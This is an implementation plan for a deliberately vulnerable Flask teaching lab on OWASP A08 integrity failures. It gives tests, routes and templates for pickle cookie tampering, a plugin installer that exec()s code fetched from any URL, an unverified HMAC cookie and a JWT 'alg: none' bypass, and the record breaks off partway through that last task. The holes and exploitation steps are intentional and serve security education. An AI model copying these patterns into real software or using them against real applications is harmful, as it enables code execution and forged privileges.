# A08 Software and Data Integrity Failures Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build A08 (OWASP Top 10 2021: Software and Data Integrity
Failures) as a new category with six examples, two per difficulty tier,
covering insecure pickle deserialization (data tampering → RCE), unsigned
plugin/update content trust (content substitution → RCE), and broken
signature verification (a dead unchecked-signature code path, and a real
JWT `alg: none` bypass).

**Architecture:** New Flask blueprint `app/categories/a08_integrity_failures/`
registered in `app/__init__.py`, following the exact A01–A07 scaffold. One
new database model (`RceProof`) provides a safe, DB-backed proof mechanism
for the two Hard-tier code-execution examples — never a shell command or
subprocess. The JWT-style token mechanism is hand-rolled with stdlib
(`hmac`/`hashlib`/`base64`/`json`), no new dependency added.

**Tech Stack:** Flask 3.0.3, Flask-SQLAlchemy, Python stdlib `pickle`,
`urllib.request`, `hmac`, `hashlib`, `base64`, `json`, Jinja2 templates,
pytest.

**Spec:** `docs/superpowers/specs/2026-09-21-owasp-lab-a08-integrity-failures-design.md`

## Global Constraints

- Every "prove arbitrary code executed" claim in this plan uses the shared
  `RceProof` database table via a `write_rce_proof(message)` helper —
  **never** `os.system`, `subprocess`, or any other shell/OS-level process.
  This is a hard constraint (see the plan's spec for why) — do not
  "improve" any exploit payload to use a shell command instead, even
  though that would look like a more traditional RCE demo.
- `write_rce_proof()` writes a real database row so the proof is visible
  regardless of which gunicorn worker process handles a later request
  checking it — do not implement this as an in-memory Python global.
- No new Python dependency is added — the JWT-style mechanism in Group 3
  is hand-rolled entirely with stdlib. Do not add PyJWT or any other
  package to `requirements.txt`.
- `app/categories/a08_integrity_failures/routes.py`'s `plugin_marketplace()`
  route unconditionally `exec()`s whatever content it fetches as part of
  "installing" a plugin — this is intentional and shared by both the
  Medium (`plugin-marketplace-tampering`) and Hard
  (`plugin-marketplace-rce`) examples, which reuse the identical route and
  differ only in which consequence their own teaching page emphasizes. Do
  not add any conditional gating ("only exec if some Hard-tier flag is
  set") — that would misrepresent the real vulnerability shape.
- `preferences()`'s `GET` handler must never call `_verify_prefs_signature()`
  — that omission is the deliberate Easy-tier vulnerability. The function
  must still exist in the code (shown in the teaching page) as a realistic
  "the check was written, just never wired up" bug shape.
- `verify_token()` must read the algorithm from the token's own header
  (`header.get("alg")`) rather than pinning to a fixed expected algorithm
  — that is the deliberate Medium-tier vulnerability. Do not add an
  algorithm allowlist check.
- Follow the exact A05/A06/A07 category scaffold: `Blueprint(...,
  template_folder="templates", url_prefix="/a08")`, `CATEGORIES.append(
  CategoryNav(...))` in `__init__.py`, `routes.py`, templates under
  `app/categories/a08_integrity_failures/templates/a08_integrity_failures/`.

---

## Task 1: Category Scaffold + Models + Example 1 (Pickle Cart Tampering)

**Files:**
- Create: `app/categories/a08_integrity_failures/__init__.py`
- Create: `app/categories/a08_integrity_failures/models.py`
- Create: `app/categories/a08_integrity_failures/routes.py`
- Create: `app/categories/a08_integrity_failures/templates/a08_integrity_failures/overview.html`
- Create: `app/categories/a08_integrity_failures/templates/a08_integrity_failures/cart.html`
- Modify: `app/__init__.py`
- Test: `tests/test_a08_cart_pickle_tampering.py`

**Interfaces:**
- Produces: Blueprint `a08_bp` at `url_prefix="/a08"`. `RceProof` model
  (`id`, `message` [str], `triggered_at` [datetime]) — not exercised by
  this task's own example, but laid down now since Tasks 5 and 6 both
  depend on it and this matches the established convention (A07 Task 1
  created both its models upfront the same way). `write_rce_proof(message)`
  helper function in `routes.py` — writes an `RceProof` row and returns
  `"proof-written"`; later tasks import and reuse it unchanged. `CART_COOKIE
  = "a08_cart"`, `serialize_cart(cart)`/`deserialize_cart(token)` helper
  functions — Task 5 reuses these exactly. `CategoryNav(id=
  "a08_integrity_failures", ...)` appended to `app.core.nav.CATEGORIES`,
  with one `ExampleNav(id="cart-pickle-tampering", ...)` so far.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a08_cart_pickle_tampering.py`:

```python
import base64
import pickle


def test_cart_shows_default_price_with_no_cookie(client):
    response = client.get("/a08/cart")
    assert response.status_code == 200
    assert b"49.99" in response.data


def test_cart_honors_a_legitimately_issued_cookie(client):
    first = client.get("/a08/cart")
    assert b"49.99" in first.data
    second = client.get("/a08/cart")
    assert b"49.99" in second.data


def test_cart_honors_a_client_crafted_tampered_price(client):
    # The attacker never needs the server's own token -- pickle has no
    # integrity protection to defeat, so knowing the expected shape is
    # enough to forge one independently.
    tampered = base64.b64encode(pickle.dumps({"item": "Widget", "price": 0.01})).decode()
    client.set_cookie("a08_cart", tampered, domain="localhost")
    response = client.get("/a08/cart")
    assert response.status_code == 200
    assert b"0.01" in response.data
    assert b"49.99" not in response.data


def test_cart_pickle_tampering_link_appears_in_overview_once_registered(client):
    response = client.get("/a08/")
    assert response.status_code == 200
    assert b"Pickle Cart Tampering" in response.data
    assert b'href="/a08/cart"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a08_cart_pickle_tampering.py -v`
Expected: FAIL — 404 (no route/blueprint exists yet).

- [ ] **Step 3: Create the models module**

Create `app/categories/a08_integrity_failures/models.py`:

```python
from datetime import datetime

from app.extensions import db


class RceProof(db.Model):
    __tablename__ = "a08_rce_proofs"

    id = db.Column(db.Integer, primary_key=True)
    message = db.Column(db.String(255), nullable=False)
    triggered_at = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
```

- [ ] **Step 4: Create the blueprint package**

Create `app/categories/a08_integrity_failures/__init__.py`:

```python
from flask import Blueprint

a08_bp = Blueprint(
    "a08_integrity_failures", __name__, template_folder="templates", url_prefix="/a08"
)

from app.categories.a08_integrity_failures import routes  # noqa: E402,F401
from app.core.nav import CATEGORIES, CategoryNav, ExampleNav  # noqa: E402

CATEGORIES.append(
    CategoryNav(
        id="a08_integrity_failures",
        short_id="A08",
        title="Software and Data Integrity Failures",
        blurb="Deserialized data, installed code, and signed tokens trusted without ever verifying they weren't tampered with.",
        blueprint_name="a08_integrity_failures",
        overview_endpoint="a08_integrity_failures.overview",
        examples=[
            ExampleNav(
                id="cart-pickle-tampering",
                title="Pickle Cart Tampering",
                group="Insecure Deserialization",
                difficulty="Easy",
                endpoint="a08_integrity_failures.cart",
            ),
        ],
    )
)
```

- [ ] **Step 5: Create the routes module**

Create `app/categories/a08_integrity_failures/routes.py`:

```python
import base64
import pickle

from flask import make_response, redirect, render_template, request, url_for

from app.categories.a08_integrity_failures import a08_bp
from app.categories.a08_integrity_failures.models import RceProof
from app.extensions import db

CART_COOKIE = "a08_cart"
DEFAULT_CART = {"item": "Widget", "price": 49.99}


def write_rce_proof(message):
    # This is the "arbitrary code" a malicious payload can run when it
    # executes -- deliberately safe and contained: it writes a database
    # row, not a shell command or subprocess. DB-backed so the proof is
    # visible regardless of which gunicorn worker handles a later request.
    db.session.add(RceProof(message=message))
    db.session.commit()
    return "proof-written"


def serialize_cart(cart):
    return base64.b64encode(pickle.dumps(cart)).decode()


def deserialize_cart(token):
    # VULNERABLE: no HMAC/signature check at all -- the app trusts
    # whatever pickle bytes the client sends back.
    return pickle.loads(base64.b64decode(token))


@a08_bp.route("/")
def overview():
    return render_template("a08_integrity_failures/overview.html")


@a08_bp.route("/cart", methods=["GET", "POST"])
def cart():
    if request.method == "POST":
        resp = make_response(redirect(url_for("a08_integrity_failures.cart")))
        resp.set_cookie(CART_COOKIE, serialize_cart(dict(DEFAULT_CART)))
        return resp

    token = request.cookies.get(CART_COOKIE)
    error = None
    cart_data = None
    if token:
        try:
            cart_data = deserialize_cart(token)
            if not isinstance(cart_data, dict) or "item" not in cart_data:
                error = "Cart data was corrupted -- resetting to default."
                cart_data = None
        except Exception as e:
            error = f"Could not read cart cookie: {e}"
    if cart_data is None:
        cart_data = dict(DEFAULT_CART)

    resp = make_response(
        render_template("a08_integrity_failures/cart.html", cart=cart_data, error=error)
    )
    resp.set_cookie(CART_COOKIE, serialize_cart(cart_data))
    return resp
```

- [ ] **Step 6: Create the overview template**

Create `app/categories/a08_integrity_failures/templates/a08_integrity_failures/overview.html`:

```html
{% extends "core/overview_base.html" %}
{% set category_short_id = "A08" %}
{% set category_title = "Software and Data Integrity Failures" %}
{% block title %}A08: Software and Data Integrity Failures{% endblock %}

{% block what_it_is %}
<p>
  Software and Data Integrity Failures cover code and data that should
  have been cryptographically verified before being trusted — a
  deserialized object, an installed plugin, a signed token — but wasn't,
  either because the check was never written, was written but never
  called, or can be defeated by an attacker who controls part of the
  verification process itself.
</p>
{% endblock %}

{% block why_it_matters %}
<p>
  Integrity checks exist specifically to answer one question: did this
  data or code come from where it claims to, unmodified? Skip that
  question and an attacker doesn't need to break your authentication or
  your encryption — they can just hand you data or code that lies about
  where it came from, and you'll trust it completely.
</p>
{% endblock %}

{% block how_exploited %}
<p>
  Attackers craft their own serialized objects, substitute plugin or
  update content at the source, or forge tokens that exploit ambiguity in
  how the verification code decides what to check — none of it requires
  breaking real cryptography, only finding the place where a check that
  should have run, didn't.
</p>
{% endblock %}

{% block attack_flow_diagram %}
sequenceDiagram
    participant Attacker
    participant App as Vulnerable App
    Attacker->>App: Submit crafted serialized data, substituted content, or a forged token
    Note over App: No integrity check ran at all, or the check trusted attacker-controlled input about how to verify itself
    App-->>Attacker: Data is tampered, code executes, or an identity is forged
{% endblock %}

{% block real_world_impact %}
<p>
  Real incidents in this category include the 2020 SolarWinds supply-chain
  compromise (a trusted auto-update channel delivered attacker-modified
  code to thousands of organizations), countless Java/PHP/Python
  applications compromised via insecure deserialization of
  attacker-controlled objects, and JWT libraries historically vulnerable
  to the `alg: none` signature-bypass class used here.
</p>
{% endblock %}

{% block vulnerable_code %}cart = pickle.loads(base64.b64decode(request.cookies.get("a08_cart")))
# no HMAC/signature check -- any pickle bytes the client sends are trusted
{% endblock %}

{% block secure_code %}# Never deserialize untrusted data with pickle. Use JSON (or another
# format with no code-execution capability) and sign it:
import hmac, hashlib
data = json.loads(base64.b64decode(token))
if not hmac.compare_digest(expected_sig, data.pop("sig")):
    abort(400)
{% endblock %}
```

- [ ] **Step 7: Create the cart example template**

Create `app/categories/a08_integrity_failures/templates/a08_integrity_failures/cart.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Pickle Cart Tampering" %}
{% set example_difficulty = "Easy" %}
{% block title %}{{ example_title }} — A08{% endblock %}

{% block explanation %}
<p>
  This shopping cart stores its contents in a cookie, serialized with
  Python's <code>pickle</code> module and base64-encoded. Pickle has no
  built-in integrity protection at all — it will happily deserialize
  <em>any</em> valid pickle bytes, whether the server wrote them or an
  attacker crafted them from scratch.
</p>
{% endblock %}

{% block detect %}
<p>
  Reload this page a few times — the cart's contents persist across
  visits via the <code>a08_cart</code> cookie. Nothing about the cookie's
  value looks like it's been signed or checksummed; it's just base64-
  encoded pickle bytes, and the server never asks "did I actually issue
  this?"
</p>
{% endblock %}

{% block exploitation %}
<p>
  Run this locally to craft your own cart cookie with a tampered price —
  you never need to see or modify the server's real cookie, just know
  the expected shape:
</p>
<pre><code class="language-bash">python3 -c "
import pickle, base64
print(base64.b64encode(pickle.dumps({'item': 'Widget', 'price': 0.01})).decode())
"</code></pre>
<p>
  Set your <code>a08_cart</code> cookie to the printed value (via browser
  dev tools, or <code>curl -b "a08_cart=&lt;value&gt;"</code>) and reload
  this page — the price shows <code>0.01</code>, accepted with no
  complaint. The server never had a way to tell your crafted pickle from
  its own.
</p>
{% endblock %}

{% block vulnerable_code %}def deserialize_cart(token):
    return pickle.loads(base64.b64decode(token))
# no HMAC/signature check at all -- the app trusts whatever pickle bytes
# the client sends back
{% endblock %}

{% block secure_code %}import hmac, hashlib, json

def serialize_cart(cart):
    payload = json.dumps(cart).encode()
    sig = hmac.new(SECRET_KEY, payload, hashlib.sha256).hexdigest()
    return base64.b64encode(payload).decode() + "." + sig

def deserialize_cart(token):
    payload_b64, sig = token.rsplit(".", 1)
    payload = base64.b64decode(payload_b64)
    expected_sig = hmac.new(SECRET_KEY, payload, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected_sig, sig):
        raise ValueError("tampered cart")
    return json.loads(payload)  # JSON, not pickle -- no code-execution risk either
{% endblock %}

{% block live_example %}
<p>Your current cart:</p>
<table class="table table-sm w-auto">
  <tbody>
    <tr><th scope="row">Item</th><td>{{ cart.item }}</td></tr>
    <tr><th scope="row">Price</th><td>${{ cart.price }}</td></tr>
  </tbody>
</table>
{% if error %}
<p class="text-danger">{{ error }}</p>
{% endif %}
<form method="post">
  <button type="submit" class="btn btn-outline-secondary btn-sm">Reset Cart</button>
</form>
{% endblock %}
```

- [ ] **Step 8: Register the blueprint in `app/__init__.py`**

Modify `app/__init__.py` — after the existing A07 registration block:

```python
    from app.categories.a07_auth_failures import a07_bp

    app.register_blueprint(a07_bp)
```

add:

```python

    from app.categories.a08_integrity_failures import a08_bp

    app.register_blueprint(a08_bp)
```

(before the `@app.route("/healthz")` block).

- [ ] **Step 9: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_a08_cart_pickle_tampering.py -v`
Expected: PASS (4 passed)

- [ ] **Step 10: Commit**

```bash
git add app/categories/a08_integrity_failures app/__init__.py tests/test_a08_cart_pickle_tampering.py
git commit -m "feat(a08): add category scaffold, RceProof model, and cart-pickle-tampering example"
```

---

## Task 2: Example 2 (Unsigned Plugin Content Trust, Medium)

**Files:**
- Modify: `app/categories/a08_integrity_failures/routes.py`
- Modify: `app/categories/a08_integrity_failures/__init__.py`
- Create: `app/categories/a08_integrity_failures/templates/a08_integrity_failures/plugin_marketplace.html`
- Test: `tests/test_a08_plugin_marketplace_tampering.py`

**Interfaces:**
- Consumes: `a08_bp`, `write_rce_proof()` from Task 1.
- Produces: Route endpoint `a08_integrity_failures.plugin_marketplace` →
  `GET/POST /a08/plugin-marketplace`. Route endpoints
  `a08_integrity_failures.official_plugin_download` → `GET
  /a08/plugin-marketplace/official-plugin.py` and
  `a08_integrity_failures.malicious_plugin_demo_download` → `GET
  /a08/plugin-marketplace/malicious-plugin-demo.py`. Module-level constants
  `OFFICIAL_PLUGIN_SOURCE`/`MALICIOUS_PLUGIN_SOURCE` — Task 6 reuses these
  exactly.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a08_plugin_marketplace_tampering.py`:

```python
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer


class _PluginHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        if self.path == "/official.py":
            self.wfile.write(b'PLUGIN_NAME = "Official Theme"\n')
        elif self.path == "/substituted.py":
            self.wfile.write(b'PLUGIN_NAME = "Substituted Theme -- not the real one"\n')
        else:
            self.send_error(404)

    def log_message(self, *args):
        pass


def _start_plugin_server():
    server = HTTPServer(("127.0.0.1", 0), _PluginHandler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread, port


def test_plugin_marketplace_page_renders(client):
    response = client.get("/a08/plugin-marketplace")
    assert response.status_code == 200


def test_plugin_marketplace_installs_content_from_any_url_with_no_verification(client):
    server, thread, port = _start_plugin_server()
    try:
        official = client.post(
            "/a08/plugin-marketplace",
            data={"plugin_url": f"http://127.0.0.1:{port}/official.py"},
        )
        assert official.status_code == 200
        assert b"Official Theme" in official.data

        substituted = client.post(
            "/a08/plugin-marketplace",
            data={"plugin_url": f"http://127.0.0.1:{port}/substituted.py"},
        )
        assert substituted.status_code == 200
        # Both installed identically (neither produced an error), proving
        # there is no signature/checksum verification distinguishing a
        # legitimate source from a substituted one.
        assert b"Substituted Theme -- not the real one" in substituted.data
        assert b"Could not install plugin" not in substituted.data
    finally:
        server.shutdown()
        thread.join(timeout=5)


def test_plugin_marketplace_tampering_link_appears_in_overview_once_registered(client):
    response = client.get("/a08/")
    assert response.status_code == 200
    assert b"Unsigned Plugin Content Trust" in response.data
    assert b'href="/a08/plugin-marketplace"' in response.data


def test_official_plugin_download_is_served(client):
    response = client.get("/a08/plugin-marketplace/official-plugin.py")
    assert response.status_code == 200
    assert b"PLUGIN_NAME" in response.data


def test_malicious_plugin_demo_download_is_served(client):
    response = client.get("/a08/plugin-marketplace/malicious-plugin-demo.py")
    assert response.status_code == 200
    assert b"write_rce_proof" in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a08_plugin_marketplace_tampering.py -v`
Expected: FAIL — 404 (no route yet).

- [ ] **Step 3: Add the routes**

Modify `app/categories/a08_integrity_failures/routes.py` — add these
imports at the top (alongside the existing ones):

```python
import urllib.error
import urllib.request

from flask import Response
```

then, after the `cart` route, add:

```python


OFFICIAL_PLUGIN_SOURCE = (
    "# Official Widget Theme Plugin v1.0\n"
    'PLUGIN_NAME = "Widget Theme"\n'
    'PLUGIN_VERSION = "1.0"\n'
)

MALICIOUS_PLUGIN_SOURCE = (
    "# \"Widget Theme\" -- served from a compromised mirror\n"
    'PLUGIN_NAME = "Widget Theme"\n'
    'PLUGIN_VERSION = "1.0"\n'
    'write_rce_proof("PWNED-VIA-UNSIGNED-PLUGIN-INSTALL")\n'
)


@a08_bp.route("/plugin-marketplace", methods=["GET", "POST"])
def plugin_marketplace():
    installed_content = None
    error = None
    plugin_url = ""
    if request.method == "POST":
        plugin_url = request.form.get("plugin_url", "")
        try:
            with urllib.request.urlopen(plugin_url, timeout=5) as resp:
                source = resp.read().decode("utf-8", errors="replace")
            installed_content = source
            # VULNERABLE: "installing" a plugin means running its source
            # immediately, with no checksum/signature check against any
            # known-good/trusted-source registry -- any URL's content is
            # trusted equally.
            exec(source, {"__builtins__": __builtins__, "write_rce_proof": write_rce_proof})
        except Exception as e:
            error = f"Could not install plugin: {e}"
    return render_template(
        "a08_integrity_failures/plugin_marketplace.html",
        installed_content=installed_content,
        error=error,
        plugin_url=plugin_url,
    )


@a08_bp.route("/plugin-marketplace/official-plugin.py")
def official_plugin_download():
    return Response(OFFICIAL_PLUGIN_SOURCE, mimetype="text/x-python")


@a08_bp.route("/plugin-marketplace/malicious-plugin-demo.py")
def malicious_plugin_demo_download():
    return Response(MALICIOUS_PLUGIN_SOURCE, mimetype="text/x-python")
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a08_integrity_failures/__init__.py` — in the
`examples=[...]` list, after the `cart-pickle-tampering` entry, add:

```python
            ExampleNav(
                id="plugin-marketplace-tampering",
                title="Unsigned Plugin Content Trust",
                group="Unsigned Software Updates & Supply Chain",
                difficulty="Medium",
                endpoint="a08_integrity_failures.plugin_marketplace",
            ),
```

- [ ] **Step 5: Create the template**

Create `app/categories/a08_integrity_failures/templates/a08_integrity_failures/plugin_marketplace.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Unsigned Plugin Content Trust" %}
{% set example_difficulty = "Medium" %}
{% block title %}{{ example_title }} — A08{% endblock %}

{% block explanation %}
<p>
  This "Plugin Marketplace" lets you install a plugin by supplying a URL
  — the server fetches whatever content lives there and installs it
  immediately. There's no checksum, no signature, no allowlist of trusted
  mirrors: any URL that returns Python source gets treated as an
  official, verified plugin.
</p>
{% endblock %}

{% block detect %}
<p>
  Install the official plugin below, then install a second one from a
  different URL serving deliberately different content — the marketplace
  accepts both identically, with no indication one might not be the
  content you expected.
</p>
{% endblock %}

{% block exploitation %}
<ol>
  <li>Download the
      <a href="{{ url_for('a08_integrity_failures.official_plugin_download') }}">official plugin source</a>
      and note its content.</li>
  <li>Save the
      <a href="{{ url_for('a08_integrity_failures.malicious_plugin_demo_download') }}">substituted plugin demo</a>
      to a local file, then host it yourself:
      <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
  </li>
  <li>Install first from
      <code>{{ url_for('a08_integrity_failures.official_plugin_download', _external=True) }}</code>
      (the real source), then from your own
      <code>http://127.0.0.1:8000/malicious-plugin-demo.py</code>
      (the substituted one) using the form below.</li>
</ol>
<p>
  Both install without a single warning. This is exactly the SolarWinds
  supply-chain pattern at demonstration scale: a trusted-looking update
  channel with no integrity verification is indistinguishable from a
  compromised one, from the application's point of view.
</p>
{% endblock %}

{% block vulnerable_code %}with urllib.request.urlopen(plugin_url, timeout=5) as resp:
    source = resp.read().decode("utf-8", errors="replace")
exec(source, {"__builtins__": __builtins__})
# no checksum/signature check against any known-good source at all
{% endblock %}

{% block secure_code %}import hashlib

with urllib.request.urlopen(plugin_url, timeout=5) as resp:
    source = resp.read()
digest = hashlib.sha256(source).hexdigest()
if digest not in TRUSTED_PLUGIN_HASHES:
    abort(400, "Plugin content does not match any trusted signature")
exec(source.decode(), {"__builtins__": __builtins__})
{% endblock %}

{% block live_example %}
<form method="post">
  <div class="mb-2">
    <label class="form-label">Plugin URL</label>
    <input class="form-control" type="text" name="plugin_url" value="{{ plugin_url }}">
  </div>
  <button type="submit" class="btn btn-primary">Install Plugin</button>
</form>
{% if installed_content %}
<p class="mt-3">Installed plugin content:</p>
<pre><code class="language-python">{{ installed_content }}</code></pre>
{% endif %}
{% if error %}
<p class="mt-3 text-danger">{{ error }}</p>
{% endif %}
{% endblock %}
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a08_plugin_marketplace_tampering.py -v`
Expected: PASS (5 passed)

- [ ] **Step 7: Commit**

```bash
git add app/categories/a08_integrity_failures tests/test_a08_plugin_marketplace_tampering.py
git commit -m "feat(a08): add unsigned-plugin-content-trust example"
```

---

## Task 3: Example 3 (Unchecked Signature on Preferences Cookie, Easy)

**Files:**
- Modify: `app/categories/a08_integrity_failures/routes.py`
- Modify: `app/categories/a08_integrity_failures/__init__.py`
- Create: `app/categories/a08_integrity_failures/templates/a08_integrity_failures/preferences.html`
- Test: `tests/test_a08_unchecked_signature_cookie.py`

**Interfaces:**
- Consumes: `a08_bp` from Task 1.
- Produces: Route endpoint `a08_integrity_failures.preferences` →
  `GET/POST /a08/preferences`.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a08_unchecked_signature_cookie.py`:

```python
import json


def test_preferences_page_renders_with_defaults(client):
    response = client.get("/a08/preferences")
    assert response.status_code == 200
    assert b"light" in response.data


def test_preferences_set_legitimately_round_trip(client):
    client.post("/a08/preferences", data={"theme": "dark"})
    response = client.get("/a08/preferences")
    assert b"dark" in response.data
    assert b"Premium: No" in response.data


def test_preferences_honors_tampered_flag_with_invalid_signature(client):
    tampered = json.dumps(
        {"theme": "dark", "premium_unlocked": True, "sig": "not-a-real-signature"}
    )
    client.set_cookie("a08_prefs", tampered, domain="localhost")
    response = client.get("/a08/preferences")
    assert response.status_code == 200
    assert b"Premium: Yes" in response.data


def test_unchecked_signature_cookie_link_appears_in_overview_once_registered(client):
    response = client.get("/a08/")
    assert response.status_code == 200
    assert b"Unchecked Signature on Preferences Cookie" in response.data
    assert b'href="/a08/preferences"' in response.data
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a08_unchecked_signature_cookie.py -v`
Expected: FAIL — 404 (no route yet).

- [ ] **Step 3: Add the route**

Modify `app/categories/a08_integrity_failures/routes.py` — add these
imports at the top (alongside the existing ones):

```python
import hashlib
import hmac
import json
```

then, after the plugin-marketplace routes, add:

```python


PREFS_COOKIE = "a08_prefs"
PREFS_SECRET = "prefs-signing-key-2026"


def _sign_prefs(data):
    payload = json.dumps(data, sort_keys=True).encode()
    return hmac.new(PREFS_SECRET.encode(), payload, hashlib.sha256).hexdigest()


def _verify_prefs_signature(data, sig):
    # This check exists in the codebase -- it's just never actually
    # called anywhere. A realistic "we meant to verify this" bug.
    expected = _sign_prefs(data)
    return hmac.compare_digest(expected, sig)


@a08_bp.route("/preferences", methods=["GET", "POST"])
def preferences():
    if request.method == "POST":
        prefs = {
            "theme": request.form.get("theme", "light"),
            "premium_unlocked": False,
        }
        sig = _sign_prefs(prefs)
        cookie_value = json.dumps({**prefs, "sig": sig})
        resp = make_response(redirect(url_for("a08_integrity_failures.preferences")))
        resp.set_cookie(PREFS_COOKIE, cookie_value)
        return resp

    raw = request.cookies.get(PREFS_COOKIE)
    prefs = {"theme": "light", "premium_unlocked": False}
    if raw:
        try:
            parsed = json.loads(raw)
            # VULNERABLE: _verify_prefs_signature() is never called here --
            # the "sig" field is parsed out and ignored, and every other
            # field is trusted directly.
            prefs = {
                "theme": parsed.get("theme", "light"),
                "premium_unlocked": parsed.get("premium_unlocked", False),
            }
        except Exception:
            pass
    return render_template("a08_integrity_failures/preferences.html", prefs=prefs)
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a08_integrity_failures/__init__.py` — in the
`examples=[...]` list, after the `plugin-marketplace-tampering` entry, add:

```python
            ExampleNav(
                id="unchecked-signature-cookie",
                title="Unchecked Signature on Preferences Cookie",
                group="Broken Signature Verification",
                difficulty="Easy",
                endpoint="a08_integrity_failures.preferences",
            ),
```

- [ ] **Step 5: Create the template**

Create `app/categories/a08_integrity_failures/templates/a08_integrity_failures/preferences.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Unchecked Signature on Preferences Cookie" %}
{% set example_difficulty = "Easy" %}
{% block title %}{{ example_title }} — A08{% endblock %}

{% block explanation %}
<p>
  This "remember my preferences" feature signs its cookie with a real
  HMAC signature — the signing code is correct, and a verification
  function exists in the codebase to check it. The bug is that the
  <em>route that reads the cookie back</em> never actually calls that
  verification function. It parses the JSON, pulls out the fields it
  wants, and simply never looks at <code>sig</code> at all.
</p>
{% endblock %}

{% block detect %}
<p>
  Set your preferences normally and look at the cookie value — it does
  contain a real <code>sig</code> field. That alone doesn't prove
  anything is checked; the only way to know is to submit a value with an
  obviously wrong signature and see whether it's still honored.
</p>
{% endblock %}

{% block exploitation %}
<p>Set your <code>a08_prefs</code> cookie to this exact value:</p>
<pre><code class="language-json">{"theme": "dark", "premium_unlocked": true, "sig": "not-a-real-signature"}</code></pre>
<p>
  Reload this page. <code>premium_unlocked</code> shows as
  <strong>Yes</strong>, despite the signature being nothing but the
  literal string "not-a-real-signature" — the check that would have
  caught this was written, but the code path that reads the cookie
  never calls it.
</p>
{% endblock %}

{% block vulnerable_code %}parsed = json.loads(request.cookies.get("a08_prefs"))
# VULNERABLE: _verify_prefs_signature() exists in this codebase but is
# never called here -- "sig" is parsed and ignored
prefs = {
    "theme": parsed.get("theme", "light"),
    "premium_unlocked": parsed.get("premium_unlocked", False),
}
{% endblock %}

{% block secure_code %}parsed = json.loads(request.cookies.get("a08_prefs"))
sig = parsed.pop("sig", None)
if not sig or not _verify_prefs_signature(parsed, sig):
    parsed = {"theme": "light", "premium_unlocked": False}  # fall back, don't trust it
prefs = parsed
{% endblock %}

{% block live_example %}
<p>Current preferences: theme = {{ prefs.theme }}, Premium: {{ "Yes" if prefs.premium_unlocked else "No" }}</p>
<form method="post">
  <div class="mb-2">
    <label class="form-label">Theme</label>
    <select class="form-select" name="theme">
      <option value="light">light</option>
      <option value="dark">dark</option>
    </select>
  </div>
  <button type="submit" class="btn btn-primary">Save Preferences</button>
</form>
{% endblock %}
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a08_unchecked_signature_cookie.py -v`
Expected: PASS (4 passed)

- [ ] **Step 7: Commit**

```bash
git add app/categories/a08_integrity_failures tests/test_a08_unchecked_signature_cookie.py
git commit -m "feat(a08): add unchecked-signature-cookie example"
```

---

## Task 4: Example 4 (JWT `alg: none` Signature Bypass, Medium)

**Files:**
- Modify: `app/categories/a08_integrity_failures/routes.py`
- Modify: `app/categories/a08_integrity_failures/__init__.py`
- Create: `app/categories/a08_integrity_failures/templates/a08_integrity_failures/api_token.html`
- Create: `app/categories/a08_integrity_failures/templates/a08_integrity_failures/admin_api.html`
- Test: `tests/test_a08_jwt_alg_none_bypass.py`

**Interfaces:**
- Consumes: `a08_bp` from Task 1.
- Produces: Route endpoint `a08_integrity_failures.api_token` → `GET
  /a08/api-token` (non-nav utility page). Route endpoint
  `a08_integrity_failures.admin_api` → `GET/POST /a08/admin-api` (this
  example's real `ExampleNav` endpoint).

- [ ] **Step 1: Write the failing test**

Create `tests/test_a08_jwt_alg_none_bypass.py`:

```python
def test_api_token_page_issues_a_guest_token(client):
    response = client.get("/a08/api-token")
    assert response.status_code == 200
    body = response.data.decode()
    # base64url of a JSON header always starts "eyJ" -- confirms a real
    # header.payload.signature token was rendered, not just any page text.
    assert "eyJ" in body
    assert body.count(".") >= 2


def test_admin_api_rejects_a_valid_guest_token(client):
    token_response = client.get("/a08/api-token")
    body = token_response.data.decode()
    start = body.index("eyJ")
    end = body.index("<", start)
    token = body[start:end].strip()

    response = client.post("/a08/admin-api", data={"token": token})
    assert response.status_code == 200
    assert b"Access denied" in response.data


def test_admin_api_accepts_a_forged_alg_none_token(client):
    import base64
    import json

    def b64url(data):
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = {"alg": "none", "typ": "JWT"}
    payload = {"user": "attacker", "role": "admin"}
    header_seg = b64url(json.dumps(header).encode())
    payload_seg = b64url(json.dumps(payload).encode())
    forged_token = f"{header_seg}.{payload_seg}."

    response = client.post("/a08/admin-api", data={"token": forged_token})
    assert response.status_code == 200
    assert b"ADMIN ACCESS GRANTED" in response.data
    assert b"attacker" in response.data


def test_admin_api_rejects_a_tampered_hs256_token(client):
    import base64
    import json

    def b64url(data):
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": "attacker", "role": "admin"}
    header_seg = b64url(json.dumps(header).encode())
    payload_seg = b64url(json.dumps(payload).encode())
    tampered_token = f"{header_seg}.{payload_seg}.not-a-real-signature"

    response = client.post("/a08/admin-api", data={"token": tampered_token})
    assert response.status_code == 200
    assert b"Invalid token" in response.data


